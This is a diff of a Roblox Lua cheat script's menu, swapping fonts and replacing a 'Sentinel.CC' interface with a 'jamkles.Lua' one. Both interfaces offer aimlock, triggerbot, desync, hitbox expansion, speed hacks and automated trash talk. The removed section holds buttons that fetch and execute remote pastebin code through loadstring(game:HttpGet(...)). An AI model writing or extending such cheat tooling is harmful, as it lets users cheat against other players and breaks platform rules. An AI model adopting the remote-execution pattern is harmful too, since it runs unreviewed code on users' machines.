@@ -2343,7 +2491,7 @@ function Menu.Prompt(Message: string, Callback: any, ...)
     Title.Position = UDim2.new(0, 0, 0.5, -100)
     Title.Text = Message
     Title.TextSize = 14
-    Title.Font = Enum.Font.Arcade
+    Title.Font = Enum.Font.SourceSans
     Title.TextColor3 = Color3.new(1, 1, 1)
     Title.Parent = Prompt
 
@@ -2383,7 +2531,7 @@ function Menu.Spectators(): Spectators
     Title.BackgroundTransparency = 1
     Title.Position = UDim2.new(0, 5, 0, 5)
     Title.Size = UDim2.new(0, 240, 0, 15)
-    Title.Font = Enum.Font.Arcade
+    Title.Font = Enum.Font.SourceSansSemibold
     Title.Text = "Spectators"
     Title.TextColor3 = Color3.new(1, 1, 1)
     Title.TextSize = 14
@@ -2425,7 +2573,7 @@ function Menu.Spectators(): Spectators
         NameLabel.BackgroundTransparency = 1
         NameLabel.Position = UDim2.new(0, 20, 0, 0)
         NameLabel.Size = UDim2.new(0, 230, 1, 0)
-        NameLabel.Font = Enum.Font.Arcade
+        NameLabel.Font = Enum.Font.SourceSans
         NameLabel.Text = tostring(Name)
         NameLabel.TextColor3 = Color3.new(1, 1, 1)
         NameLabel.TextSize = 14
@@ -2488,7 +2636,7 @@ function Menu.Keybinds(): Keybinds
     Title.BackgroundTransparency = 1
     Title.Position = UDim2.new(0, 5, 0, 5)
     Title.Size = UDim2.new(0, 240, 0, 15)
-    Title.Font = Enum.Font.Arcade
+    Title.Font = Enum.Font.SourceSansSemibold
     Title.Text = "Key binds"
     Title.TextColor3 = Color3.new(1, 1, 1)
     Title.TextSize = 14
@@ -2530,7 +2678,7 @@ function Menu.Keybinds(): Keybinds
         NameLabel.BackgroundTransparency = 1
         NameLabel.Position = UDim2.new(0, 5, 0, 0)
         NameLabel.Size = UDim2.new(0, 180, 1, 0)
-        NameLabel.Font = Enum.Font.Arcade
+        NameLabel.Font = Enum.Font.SourceSans
         NameLabel.Text = Name
         NameLabel.TextColor3 = Color3.new(1, 1, 1)
         NameLabel.TextSize = 14
@@ -2541,7 +2689,7 @@ function Menu.Keybinds(): Keybinds
         StateLabel.BackgroundTransparency = 1
         StateLabel.Position = UDim2.new(0, 190, 0, 0)
         StateLabel.Size = UDim2.new(0, 40, 1, 0)
-        StateLabel.Font = Enum.Font.Arcade
+        StateLabel.Font = Enum.Font.SourceSans
         StateLabel.Text = "[" .. tostring(State) .. "]"
         StateLabel.TextColor3 = Color3.new(1, 1, 1)
         StateLabel.TextSize = 14
@@ -2614,7 +2762,7 @@ function Menu.Indicators(): Indicators
     Title.BackgroundTransparency = 1
     Title.Position = UDim2.new(0, 5, 0, 5)
     Title.Size = UDim2.new(0, 240, 0, 15)
-    Title.Font = Enum.Font.Arcade
+    Title.Font = Enum.Font.SourceSansSemibold
     Title.Text = "Indicators"
     Title.TextColor3 = Color3.new(1, 1, 1)
     Title.TextSize = 14
@@ -2658,7 +2806,7 @@ function Menu.Indicators(): Indicators
         NameLabel.BackgroundTransparency = 1
         NameLabel.Position = UDim2.new(0, 5, 0, 0)
         NameLabel.Size = UDim2.new(0, 130, 0, 15)
-        NameLabel.Font = Enum.Font.Arcade
+        NameLabel.Font = Enum.Font.SourceSans
         NameLabel.Text = Name
         NameLabel.TextColor3 = Color3.new(1, 1, 1)
         NameLabel.TextSize = 14
@@ -2669,7 +2817,7 @@ function Menu.Indicators(): Indicators
         StateLabel.BackgroundTransparency = 1
         StateLabel.Position = UDim2.new(0, 180, 0, 0)
         StateLabel.Size = UDim2.new(0, 40, 0, 15)
-        StateLabel.Font = Enum.Font.Arcade
+        StateLabel.Font = Enum.Font.SourceSans
         StateLabel.Text = "[" .. tostring(Value) .. "]"
         StateLabel.TextColor3 = Color3.new(1, 1, 1)
         StateLabel.TextSize = 14
@@ -2780,7 +2928,7 @@ function Menu.Watermark(): Watermark
     Watermark.Title.BackgroundTransparency = 1
     Watermark.Title.Position = UDim2.new(0, 5, 0, -1)
     Watermark.Title.Size = UDim2.new(0, 240, 0, 15)
-    Watermark.Title.Font = Enum.Font.Arcade
+    Watermark.Title.Font = Enum.Font.SourceSansSemibold
     Watermark.Title.Text = ""
     Watermark.Title.TextColor3 = Color3.new(1, 1, 1)
     Watermark.Title.TextSize = 14
@@ -2851,488 +2999,1581 @@ function Menu:Init()
     end)
 end
 
-
-local UserInputService = game:GetService("UserInputService")
-local VirtualInputManager = game:GetService("VirtualInputManager")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local CoreGui = game:GetService("CoreGui")
-local dragging, dragInput, dragStart, startPos
-
-getgenv().Trigger = false
-
-local function createScreenGui()
-    local existingGui = CoreGui:FindFirstChild("MyScreenGui")
-    if existingGui then
-        return existingGui
-    end
-
-    local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "MyScreenGui"
-    screenGui.Parent = CoreGui
-    return screenGui
-end
-
-local function initializeToggleButton(screenGui)
-    local button = Instance.new("TextButton")
-    button.Size = UDim2.new(0, 100, 0, 60)
-    button.Position = UDim2.new(1, -100, 0, 80)
-    button.Text = getgenv().lol and "ON" or "OFF"
-    button.Font = Enum.Font.Arcade
-    button.TextSize = 14
-    button.BackgroundColor3 = Color3.new(0, 0, 0)
-    button.BackgroundTransparency = 0
-    button.TextColor3 = Color3.new(1, 1, 1)
-    button.BorderSizePixel = 0
-
-    button.ClipsDescendants = true
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 5)
-    corner.Parent = button
-
-    button.Parent = screenGui
-
-    button.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
-            getgenv().Trigger = not getgenv().Trigger
-            button.Text = getgenv().Trigger and "Trigger ON" or "Trigger OFF"
-
-            dragging = true
-            dragStart = input.Position
-            startPos = button.Position
-
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then
-                    dragging = false
-                end
-            end)
-        end
-    end)
-
-    button.InputChanged:Connect(function(input)
-        if dragging and (input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement) then
-            dragInput = input
-            local delta = dragInput.Position - dragStart
-            button.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        end
-    end)
-end
-
-local screenGui = createScreenGui()
-
-
-getgenv().Settings = {
-    Enabled = true,
-    DOT = true,
-    NOTIF = true,
-    AUTOPRED = true,
-    RESOLVER = "MoveDirection",
-    Prediction = true,
-    HorizontalPrediction = 0,
-    SelectedPart = "HumanoidRootPart",
-    LockType = "Namecall",
-    AutoAir = false,
-    VerticalPrediction = 0,
-    TargetStrafe = {
-        Enabled = false,
-        Distance = 8,
-        Height = 3,
-        Speed = 7
-    },
-    LookAt = true,
-    Camera = false,
-    jumpoffset = -1,
-    Flick = false,
-    ShootDelay = 0.220,
-    AntiAimViewer = false,
-    VelocityY = -10,
-    VelocityZ = -30,
-    VelocityX = 20,
-    desyncEnabled = false,
-    smoothness = 0.6,
-    HitsoundEnabled = false,
-    Volume = 1,
-    VelocityControl = false,
-    NoGroundShot = false,
-    StrafeType = 'Randomize',
-    FallOffset = 0,
-    View = false,
-    PredMode = "Calculation"
-}
-
-getgenv().Finobe1 = false
-getgenv().ShowFOV = false
-getgenv().sigma = 0.127
-getgenv().Trigger = false
-
-Menu:SetSize(400, 350)
-
-
-Menu.Notify("Script Loaded.", 2)
-Menu.Tab("MAIN")
-Menu.Tab("MISC")
-Menu.Tab("Visual")
-Menu.Tab("BodyPart")
-
-Menu.Container("MAIN", "Toggle", "Left")
-
-Menu.CheckBox("MAIN", "Toggle", "Aimlock", getgenv().Settings.Enabled, function(value) 
-    getgenv().Settings.Enabled = value
-end, "Checkbox Tooltip")
-
-Menu.CheckBox("MAIN", "Toggle", "Camera", getgenv().Settings.Camera, function(value)
-    getgenv().Settings.Camera = value
-end)
-
-
-
-Menu.CheckBox("MAIN", "Toggle", "Notification", getgenv().Settings.NOTIF, function(value)
-    getgenv().Settings.NOTIF = value
-end)
-
-
-Menu.CheckBox("MAIN", "Toggle", "AntiGroundShot", getgenv().Settings.NoGroundShot, function(value)
-    getgenv().Settings.NoGroundShot = value
-end)
-
-Menu.CheckBox("MAIN", "Toggle", "LookAt", getgenv().Settings.LookAt, function(value)
-    getgenv().Settings.LookAt = value
-end)
-
-
-Menu.CheckBox("MAIN", "Toggle", "auto prediction", getgenv().Settings.AUTOPRED, function(value)
-    getgenv().Settings.AUTOPRED = value
-end)
-
-Menu.CheckBox("MAIN", "Toggle", "Resolver", false, function(value) 
-    getgenv().Settings.ResolverEnabled = value
-end, "Checkbox Tooltip")
-
-Menu.ComboBox("MAIN", "Toggle", "Resolver Type", getgenv().Settings.RESOLVER, {"MoveDirection", "LookVector"}, function(selected)
-    getgenv().Settings.RESOLVER = selected
-end, "Select Resolver Type")
-
-Menu.ComboBox("MAIN", "Toggle", "Auto Prediction Type", getgenv().Settings.PredMode, {"Calculation", "PingBased"}, function(selected)
-    getgenv().Settings.PredMode = selected
-end, "Select Resolver Type")
-
-
-
-
-
-
-
-
-
-Menu.Container("MAIN", "Misc", "Right")
-
-
-
-
-
-
-
-
-
-
-Menu.TextBox("MAIN", "Misc", "Horizontal Prediction", tostring(getgenv().Settings.HorizontalPrediction), function(input)
-    getgenv().Settings.HorizontalPrediction = tonumber(input) or getgenv().Settings.HorizontalPrediction
-end, "Horizontal Prediction")
-
-Menu.TextBox("MAIN", "Misc", "Vertical Prediction", tostring(getgenv().Settings.VerticalPrediction), function(input)
-    getgenv().Settings.VerticalPrediction = tonumber(input) or getgenv().Settings.VerticalPrediction
-end, "Vertical Prediction")
-
-Menu.Button("MAIN", "Misc", "Apply Prediction", function()
-    getgenv().Settings.HorizontalPrediction = getgenv().Settings.HorizontalPrediction
-    getgenv().Settings.VerticalPrediction = getgenv().Settings.VerticalPrediction
-end, "Apply the current predictions")
-
-Menu.TextBox("MAIN", "Misc", "Jump Offset", tostring(getgenv().Settings.jumpoffset), function(input)
-    getgenv().Settings.jumpoffset = tonumber(input) or getgenv().Settings.jumpoffset
-end, "Jump Offset")
-
-
-
-Menu.TextBox("MAIN", "Misc", "Cam Smoothness", tostring(getgenv().Settings.smoothness), function(input)
-    getgenv().Settings.smoothness = tonumber(input) or getgenv().Settings.smoothness
-end, "Cam Smoothness")
-
-Menu.ComboBox("MAIN", "Misc", "Lock Type", getgenv().Settings.LockType or "Namecall", {"Namecall", "Index"}, function(selected)
-    getgenv().Settings.LockType = selected
-end, "Select Lock Type")
-
-Menu.CheckBox("MAIN", "Misc", "Auto Air", getgenv().Settings.AutoAir, function(Value)
-    getgenv().Settings.AutoAir = Value
-end)
-
-
-
-Menu.CheckBox("MAIN", "Misc", "Flick", getgenv().Settings.Flick, function(value)
-    getgenv().Settings.Flick = value
-end)
-
-Menu.TextBox("MAIN", "Misc", "Shoot Delay", tostring(getgenv().Settings.ShootDelay), function(input)
-    getgenv().Settings.ShootDelay = tonumber(input) or getgenv().Settings.ShootDelay
-end, "Shoot Delay")
-
-Menu.ColorPicker("MAIN", "Misc", "Menu Accent", Color3.fromRGB(153, 0, 153), 1, function(color)
-    Menu.Accent = color
-end, "Colorpicker Tooltip")
-
-
-
-Menu.Container("MISC", "Cframe", "Left")
-
-Menu.CheckBox("MISC", "Cframe", "Cframe", getgenv().cframespeedtoggle, function(value)
-    getgenv().cframespeedtoggle = value
-end)
-
-getgenv().speedvalue = 0.5
-
-Menu.TextBox("MISC", "Cframe", "Cframe Speed", tostring(getgenv().speedvalue), function(input)
-    getgenv().speedvalue = tonumber(input) or getgenv().speedvalue
-end, "Speed")
-
-
-
-Menu.Container("MISC", "Orbit", "Right")
-
-
-
-
-Menu.CheckBox("MISC", "Orbit", "Toggle", getgenv().Settings.TargetStrafe.Enabled, function(value)
-    getgenv().Settings.TargetStrafe.Enabled = value
-end)
-
-Menu.ComboBox("MISC", "Orbit", "Strafe Type", getgenv().Settings.StrafeType, {"Randomize", "Orbit"}, function(selected)
-    getgenv().Settings.StrafeType = selected
-end, "Select Resolver Type")
-
-Menu.CheckBox("MISC", "Orbit", "View", getgenv().Settings.View, function(value)
-    getgenv().Settings.View = value
-end)
-
-
-Menu.TextBox("MISC", "Orbit", "Distance", tostring(getgenv().Settings.TargetStrafe.Distance), function(input)
-    getgenv().Settings.TargetStrafe.Distance = tonumber(input) or getgenv().Settings.TargetStrafe.Distance
-end, "Distance")
-
-Menu.TextBox("MISC", "Orbit", "Speed", tostring(getgenv().Settings.TargetStrafe.Speed), function(input)
-    getgenv().Settings.TargetStrafe.Speed = tonumber(input) or getgenv().Settings.TargetStrafe.Speed
-end, "Speed")
-
-Menu.TextBox("MISC", "Orbit", "Height", tostring(getgenv().Settings.TargetStrafe.Height), function(input)
-    getgenv().Settings.TargetStrafe.Height = tonumber(input) or getgenv().Settings.TargetStrafe.Height
-end, "Speed")
-
-Menu.Container("MISC", "Anti", "Left")
-
-Menu.Button("MISC", "Anti", "Anti Aim Viewer", function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/wUb5L8Xm", true))()
-end, "This is a clickable button.")
-
-
-Menu.Button("MISC", "Anti", "Anti Lag", function()
-    loadstring(game:HttpGet("https://pastebin.com/raw/TiusSk9i",true))()
-end, "This is a clickable button.")
-
-Menu.CheckBox("MISC", "Anti", "Desync", getgenv().Settings.desyncEnabled, function(value)
-    getgenv().Settings.desyncEnabled = value
-end)
-
-Menu.CheckBox("MISC", "Anti", "Void Desync", getgenv().Finobe1, function(value)
-    getgenv().Finobe1 = value
-end)
-
-Menu.CheckBox("MISC", "Anti", "Custom AntiLock", false, function(value) 
-    getgenv().Settings.VelocityControl = value
-end, "Checkbox Tooltip")
-
-Menu.TextBox("MISC", "Anti", "Y", "", function(input)
-    getgenv().Settings.VelocityY = input
-end, "Y")
-
-
-Menu.TextBox("MISC", "Anti", "X", "", function(input)
-    getgenv().Settings.VelocityX = input
-end, "X")
-
-Menu.TextBox("MISC", "Anti", "Z", "", function(input)
-    getgenv().Settings.VelocityZ = tonumber(input) or 1
-end, "Z")
-
-
-Menu.Container("MISC", "TriggerBot", "Right")
-
-Menu.Slider("MISC", "TriggerBot", "Fov Size", 5, 300, getgenv().FOVSize or 25, "", 1, function(value)
-    getgenv().FOVSize = value
-end, "Adjust")
-
-Menu.TextBox("MISC", "TriggerBot", "Trigger Delay", tostring(getgenv().sigma), function(input)
-    getgenv().sigma = tonumber(input) or getgenv().sigma
-end, "sigma")
-
-Menu.CheckBox("MISC", "TriggerBot", "Fov", getgenv().ShowFov, function(value) 
-    getgenv().ShowFOV  = value
-end, "Checkbox Tooltip")
-
-Menu.CheckBox("MISC", "TriggerBot", "TriggerBot", getgenv().Trigger, function(value) 
-    getgenv().Trigger = value
-end, "Checkbox Tooltip")
-
-Menu.Button("MISC", "TriggerBot", "Load Button", function()
-    initializeToggleButton(screenGui)
-end, "This is a clickable button.")
-
-Menu.Container("Visual", "Settings", "Right")
-
-Menu.CheckBox("Visual", "Settings", "Enable Hitsound", getgenv().Settings.HitsoundEnabled, function(Value)
-    getgenv().Settings.HitsoundEnabled = Value
-end)
-
-
-Menu.TextBox("Visual", "Settings", "Volume", tostring(getgenv().Settings.Volume or 1), function(input)
-    getgenv().Settings.Volume = tonumber(input) or getgenv().Settings.Volume
-end)
-
-local selectedHitsound = getgenv().Settings.hitsounds or "TF2 Hitsound"
-
-local function updateHitsound(Option)
-    selectedHitsound = Option
-    getgenv().Settings.hitsounds = selectedHitsound
-end
-
-Menu.ComboBox("Visual", "Settings", "Hitsound 1", selectedHitsound, 
-    {"Bonk", "Lazer Beam", "Windows XP Error", "TF2 Hitsound", "TF2 Critical", "TF2 Bat"}, 
-    updateHitsound, "Select Hitsound 1")
-
-Menu.ComboBox("Visual", "Settings", "Hitsound 2", selectedHitsound, 
-    {"Bow Hit", "Bow", "OSU", "Minecraft Hit", "Steve", "1nn", "Rust", "TF2 Pan", "Neverlose", "Mario"}, 
-    updateHitsound, "Select Hitsound 2")
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextButton = Instance.new("TextButton")
+local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BackgroundTransparency = 0
+Frame.Position = UDim2.new(1, -120, 0, 0)
+Frame.Size = UDim2.new(0, 100, 0, 50)
+
+TextButton.Parent = Frame
+TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.BackgroundTransparency = 1.000
+TextButton.Size = UDim2.new(1, 0, 1, 0)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = ">_<"
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0) 
+TextButton.TextScaled = true
+TextButton.TextSize = 30
+TextButton.TextStrokeColor3 = Color3.fromHex("#8F30A7")
+TextButton.TextStrokeTransparency = 0.000
+TextButton.TextWrapped = true
     
-Menu.CheckBox("Visual", "Settings", "Enable Backtrack", getgenv().Settings.BacktrackEnabled, function(Value)
-    getgenv().Settings.BacktrackEnabled = Value
+TextButton.MouseButton1Down:Connect(function()
+    Menu_Frame.Visible = not Menu_Frame.Visible
 end)
 
-local materials = {
-    "Plastic", "SmoothPlastic", "Wood", "Metal", "Glass", "Neon",
-    "Slate", "CorrodedMetal", "Brick", "Ice", "Grass", "Granite",
-    "Pebble", "SmoothTerrain", "Fabric", "Sand", "Concrete", 
-    "WoodPlanks", "BrickGradient", "Cement"
-}
 
-local selectedMaterial = "Neon"
+UITextSizeConstraint.Parent = TextButton
+UITextSizeConstraint.MaxTextSize = 30
 
-local function updateMaterial(selected)
-    getgenv().Settings.BacktrackMaterial = Enum.Material[selected]
+local player = game.Players.LocalPlayer
+
+
+local function onCharacterAdded(character)
+    ScreenGui.Parent = player.PlayerGui
 end
 
-Menu.ComboBox("Visual", "Settings", "Backtrack Material", selectedMaterial, materials, updateMaterial, "Select Backtrack Material")
+
+local function connectCharacterAdded()
+    player.CharacterAdded:Connect(onCharacterAdded)
+end
+
+connectCharacterAdded()
+
+player.CharacterRemoving:Connect(function()
+    ScreenGui.Parent = nil
+end) 
+
+--[[
 
 
-    Menu.ColorPicker("Visual", "Settings", "Backtrack Color", Color3.fromRGB(255, 0, 0), 1, function(color)
-    getgenv().Settings.BacktrackColor = color  
-end, "Colorpicker Tooltip")
+@jamkles body part endless ui mobile example, if any bugs contact 
+me
 
-Menu.Container("Visual", "Visual", "Left")
-
-Menu.CheckBox("Visual", "Visual", "ForceField", getgenv().Settings.ForceFieldEnabled, function(value)
-    getgenv().Settings.ForceFieldEnabled = value
-end)
+]]
 
 
-Menu.CheckBox("Visual", "Visual", "Tracer", getgenv().Settings.TracerEnabled, function(value)
-    getgenv().Settings.TracerEnabled = value
-end)
-
-Menu.CheckBox("Visual", "Visual", "Cham", getgenv().Settings.DOT, function(value)
-    getgenv().Settings.DOT = value
-end)
-
-Menu.Slider("Visual", "Visual", "Cham Fill", 0, 1, getgenv().Settings.Cham3 or 0.1, "", 2, function(value)
-    getgenv().Settings.Cham3 = value
-end, "Adjust Cham3 from 0.1 to 1")
-
-Menu.ColorPicker("Visual", "Visual", "ForceField", Color3.fromRGB(5, 0, 255), 1, function(color)
-    getgenv().Settings.ForceColor = color  
-end, "Colorpicker Tooltip")
-
-Menu.ColorPicker("Visual", "Visual", "Cham Fill", Color3.fromRGB(5, 0, 255), 1, function(color)
-    getgenv().Settings.ChamFill = color  
-end, "Colorpicker Tooltip")
-
-Menu.ColorPicker("Visual", "Visual", "Cham Outline", Color3.fromRGB(5, 0, 255), 1, function(color)
-    getgenv().Settings.ChamFill2 = color  
-end, "Colorpicker Tooltip")
-
-Menu.ColorPicker("Visual", "Visual", "Tracer", Color3.fromRGB(5, 0, 255), 1, function(color)
-    getgenv().Settings.ChamFill3 =  color
-end, "Colorpicker Tooltip")
-
-
-Menu.BodyPart("BodyPart", "BodyPart", "Left", function(bool)
-getgenv().Settings.SelectedPart = bool
+Menu:SetSize(500, 400)
+Menu.Notify("Script Loaded.", 2)
+Menu.Tab("Legit")
+Menu.BodyPart("Legit", "BodyPart", "Right", function(bool)
+jamkles.camlock.aim_part = bool
 end
 )
+Menu.Tab("Rage")
+Menu.Tab("Visuals")
+Menu.Tab("settings")
 
-Menu:SetTitle("Sentinel.CC | BETA")
+Menu.Container("Legit", "Camlock", "Left")
+Menu.Container("Legit", "AutoPred", "Right")
+
+Menu.Container("Legit", "Offsets", "Left")
+
+Menu.Container("Legit", "TriggerBot", "Left")
+
+Menu.Container("Legit", "Resolver", "Left")
+
+Menu.Container("Legit", "Hitbox Expander", "Left")
+
+Menu.Container("Legit", "Trashtalk", "Left")
+
+Menu.Container("Rage", "TargetStrafe", "Left")
+
+Menu.Container("Rage", "Cframe", "Right")
+
+Menu.Container("Rage", "LockPos", "Left")
+
+Menu.Container("Visuals", "Tracer", "Left")
+
+
+Menu.Container("Visuals", "Colorcorrection", "Right")
+
+Menu.Container("Visuals", "HitEffects", "Left")
+
+
+-- ////// camlock //////
+
+Menu.CheckBox(
+    "Legit",
+    "Camlock",
+    "Toggle camlock",
+    false,
+    function(value)
+			jamkles.camlock.Enabled = value
+    end,
+    "Toggles lock"
+)
+
+Menu.CheckBox(
+    "Legit",
+    "Camlock",
+    "Auto reload",
+    false,
+    function(value)
+			jamkles.camlock.AutoReload = value
+    end,
+    "reload automatically after bullets out"
+)
+
+Menu.CheckBox(
+    "Legit",
+    "Camlock",
+    "Antigroundshot",
+    false,
+    function(value)
+			jamkles.camlock.AntiGroundShots = value
+    end,
+    " "
+)
+
+Menu.CheckBox(
+    "Legit",
+    "Camlock",
+    "AntiAimView",
+    false,
+    function(value)
+			jamkles.camlock.AntiAimView = value
+    end,
+    " "
+)
+
+Menu.TextBox(
+    "Legit",
+    "Camlock",
+    "Prediction",
+    function(value)
+			jamkles.camlock.prediction = value
+    end,
+    "Set Prediction value"
+)
+
+
+
+Menu.TextBox(
+    "Legit",
+    "Camlock",
+    "Smoothness",
+    function(value)
+			jamkles.camlock.smoothness = value
+    end,
+    "Set Smoothness value"
+)
+
+Menu.ComboBox(
+    "Legit",
+    "Camlock",
+    "Hitpart",
+    "UpperTorso",
+    {"Head", "UpperTorso", "LowerTorso", "HumanoidRootPart"},
+    function(value)
+			jamkles.camlock.aim_part = value
+    end,
+    "The part to aim at a player "
+)
+
+-- ////// AutoPred //////
+
+Menu.CheckBox(
+    "Legit",
+    "AutoPred",
+    "Toggle AutoPred",
+    false,
+    function(value)
+			jamkles.Autopred.Enabled = value
+    end,
+    "Toggles AutoPred"
+)
+
+Menu.CheckBox(
+    "Legit",
+    "AutoPred",
+    "Enable Simple AutoPred",
+    false,
+    function(value)
+			jamkles.Autopred.Simple = value
+    end,
+    "Enables Simple AutoPred"
+)
+
+Menu.CheckBox(
+    "Legit",
+    "AutoPred",
+    "Enable Complex AutoPred",
+    false,
+    function(value)
+			jamkles.Autopred.Complex = value
+    end,
+    "Enables Complex AutoPred"
+)
+
+
+
+-- ////// Offsets //////
+
+Menu.CheckBox(
+    "Legit",
+    "Offsets",
+    "Toggle Offsets",
+    false,
+    function(value)
+			jamkles.Offsets.Enabled = value
+    end,
+    "Toggles jamp and land function"
+)
+
+Menu.TextBox(
+    "Legit",
+    "Offsets",
+    "Jump",
+    function(value)
+			jamkles.Offsets.jumpOffset = value
+    end,
+    "Set jump offset value"
+)
+
+Menu.TextBox(
+    "Legit",
+    "Offsets",
+    "Land",
+    function(value)
+			jamkles.Offsets.fallOffset = value
+    end,
+    "Set land offset value"
+)
+
+-- ////// Trigger Bot //////
+
+Menu.CheckBox(
+    "Legit",
+    "TriggerBot",
+    "Toggle TriggerBot",
+    false,
+    function(value)
+			jamkles.Triggerbot.Enabled = value
+    end,
+    "a"
+)
+
+Menu.TextBox(
+    "Legit",
+    "TriggerBot",
+    "delay",
+    function(value)
+			jamkles.Triggerbot.delay = value
+    end,
+    "value set for trash talk delay"
+)
+
+-- ////// Resolver //////
+
+Menu.CheckBox(
+    "Legit",
+    "Resolver",
+    "Toggle Resolver",
+    false,
+    function(value)
+			jamkles.Resolver.Enabled = value
+    end,
+    "Toggles Reolver for desyncs"
+)
+
+Menu.TextBox(
+    "Legit",
+    "Resolver",
+    "resolving method",
+    function(value)
+			jamkles.Resolver.Method = value
+    end,
+    "Set at recalculating"
+)
+
+Menu.ComboBox(
+    "Legit",
+    "Resolver",
+    "Hitpart",
+    "Head",
+    {"Head", "UpperTorso", "LowerTorso", "HumanoidRootPart"},
+    function(value)	jamkles.Resolver.PredictionSettings.HitPart = value
+    end,
+    "Resolving aim part "
+)
+
+-- ////// Hitbox expander //////
+
+Menu.CheckBox(
+    "Legit",
+    "Hitbox Expander",
+    "Toggle Hitbox expander",
+    false,
+    function(value)
+			jamkles.Reach.Enabled = value
+    end,
+    "Toggles expander for hitbox"
+)
+
+Menu.CheckBox(
+    "Legit",
+    "Hitbox Expander",
+    "Toggle bring all",
+    false,
+    function(value)
+			jamkles.BringAll.Enabled = value
+    end,
+    "Toggles bring all"
+)
+
+Menu.TextBox(
+    "Legit",
+    "Hitbox Expander",
+    "bring distance",
+    function(value)
+			jamkles.BringAll.Distance = value
+    end,
+    "Set at distance"
+)
+
+-- ////// Trash talk //////
+
+Menu.CheckBox(
+    "Legit",
+    "Trashtalk",
+    "Toggle trashtalkonko",
+    false,
+    function(value)
+			jamkles.Trashtalk.trashtalkonkill = value
+    end,
+    "Toggles a trashtalk"
+)
+
+Menu.TextBox(
+    "Legit",
+    "Trashtalk",
+    "delay",
+    function(value)
+			jamkles.Trashtalk.delay = value
+    end,
+    "value set for trash talk delay"
+)
+
+
+-- ////// Target strafe //////
+
+Menu.CheckBox(
+    "Rage",
+    "TargetStrafe",
+    "Toggle stafe",
+    false,
+    function(value)
+			jamkles.TargetStrafe.Enabled = value
+    end,
+    "Toggles a targetstrafe"
+)
+
+Menu.CheckBox(
+    "Rage",
+    "TargetStrafe",
+    "Toggle randomiser",
+    false,
+    function(value)
+			jamkles.TargetStrafe.Randomiser = value
+    end,
+    "Toggles a randomiser strafe"
+)
+
+Menu.Slider(
+    "Rage",
+    "TargetStrafe",
+    "Strafe Speed",
+    1,
+    50,
+    1,
+    "%",
+    0,
+    function(value)
+			jamkles.TargetStrafe.Speed = value
+    end,
+    "value set for strafe speed"
+)
+
+Menu.Slider(
+    "Rage",
+    "TargetStrafe",
+    "Strafe Height",
+    1,
+    50,
+    1,
+    "%",
+    0,
+    function(value)
+			jamkles.TargetStrafe.Height = value
+    end,
+    "value set for strafe height"
+)
+
+Menu.Slider(
+    "Rage",
+    "TargetStrafe",
+    "Strafe radius",
+    1,
+    50,
+    1,
+    "%",
+    0,
+    function(value)
+			jamkles.TargetStrafe.Radius = value
+    end,
+    "value set for strafe radius"
+)
+
+-- ////// Cframe //////
+
+Menu.CheckBox(
+    "Rage",
+    "Cframe",
+    "Toggle cframe",
+    false,
+    function(value)
+			jamkles.CframeSpeed.Enabled = value
+    end,
+    "Toggles a Cframe speed "
+)
+
+Menu.Slider(
+    "Rage",
+    "Cframe",
+    "Speed amount",
+    1,
+    10,
+    1,
+    "%",
+    0,
+    function(value)
+			jamkles.CframeSpeed.Speed = value
+    end,
+    "value set for Cframe Speed"
+)
+
+-- ////// LockPos //////
+
+Menu.CheckBox(
+    "Rage",
+    "LockPos",
+    "Toggle LockPos",
+    false,
+    function(value)
+			jamkles.Lockposition.Enabled = value
+    end,
+    "Toggles Lockposition"
+)
+
+Menu.CheckBox(
+    "Rage",
+    "LockPos",
+    "X Pos",
+    false,
+    function(value)
+			jamkles.Lockposition.Xpos = value
+    end,
+    "Toggles x pos"
+)
+
+Menu.CheckBox(
+    "Rage",
+    "LockPos",
+    "Y Pos",
+    false,
+    function(value)
+			jamkles.Lockposition.Ypos = value
+    end,
+    "Toggles y pos"
+)
+
+Menu.CheckBox(
+    "Rage",
+    "LockPos",
+    "Z Pos",
+    false,
+    function(value)
+			jamkles.Lockposition.Zpos = value
+    end,
+    "Toggles z pos"
+)
+
+-- ////// Tracer //////
+
+Menu.CheckBox(
+    "Visuals",
+    "Tracer",
+    "Toggle Tracers",
+    false,
+    function(value)
+			jamkles.Tracer.Visable = value
+    end,
+    "Toggles tracer"
+)
+
+Menu.TextBox(
+    "Visuals",
+    "Tracer",
+    "Transparency",
+    function(value)
+			jamkles.Tracer.Transparency = value
+    end,
+    "Transparency"
+)
+
+Menu.TextBox(
+    "Visuals",
+    "Tracer",
+    "Thickness",
+    function(value)
+			jamkles.Tracer.Thickness = value
+    end,
+    "Thickness"
+)
+
+-- ////// colour correction //////
+
+Menu.CheckBox(
+    "Visuals",
+    "Colorcorrection",
+    "Toggle Colorcorrection",
+    false,
+    function(value)
+			jamkles.VisualEffects.ColorCorrection = value
+    end,
+    "Toggles tracer"
+)
+
+Menu:SetTitle("jamkles.Lua")
 Menu:SetVisible(true)
 Menu:Init()
 
 
+getgenv().jamkles = {
+    camlock = {
+        Enabled = false,
+        Toggled = false,
+        prediction = 0.14285,
+        smoothness = 0.4,
+        aim_part = "HumanoidRootPart",
+        AutoReload = false,
+        AntiAimView = false,
+        AntiGroundShots = false
+    },
+    Autopred = {
+        Enabled = false,
+        Simple = false,
+        Complex = false
+    },
+    CframeSpeed = {
+        Enabled = false,
+        Speed = 3
+    },
+    Fov = {
+        Visible = true,
+        Transparency = 0,
+        Size = 120,
+        Filled = false,
+        Thickness = 2.5,
